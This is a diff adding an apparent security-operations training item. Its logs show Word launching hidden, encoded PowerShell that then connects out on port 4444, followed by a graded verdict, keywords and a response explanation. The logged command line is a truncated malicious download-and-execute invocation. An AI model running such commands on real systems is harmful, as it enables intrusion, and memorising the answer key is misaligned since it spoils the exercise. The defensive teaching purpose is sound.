@@ -1,0 +1,21 @@
+{
+  "id": "encoded-powershell-from-word",
+  "title": "Word spawns encoded PowerShell",
+  "difficulty": "medium",
+  "logs": [
+    "2026-03-01 09:14:10 EventID=1 Host=WS02 User=bob Image=WINWORD.EXE CommandLine=\"WINWORD.EXE invoice.docm\" Parent=explorer.exe",
+    "2026-03-01 09:14:32 EventID=1 Host=WS02 User=bob Image=powershell.exe CommandLine=\"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...\" Parent=WINWORD.EXE",
+    "2026-03-01 09:15:02 EventID=3 Host=WS02 User=bob Image=powershell.exe Dest=203.0.113.50:4444"
+  ],
+  "question": "Is this a true positive? What do you do next?",
+  "verdict": "true_positive",
+  "keywords": [
+    "macro",
+    "parent",
+    "encoded",
+    "isolate",
+    "decode",
+    "4444"
+  ],
+  "explanation": "Word starting hidden, encoded PowerShell is the classic macro-based initial access pattern, and the outbound connection on 4444 confirms command and control. Isolate WS02, decode the payload, find the document and other recipients, check persistence and credentials."
+}
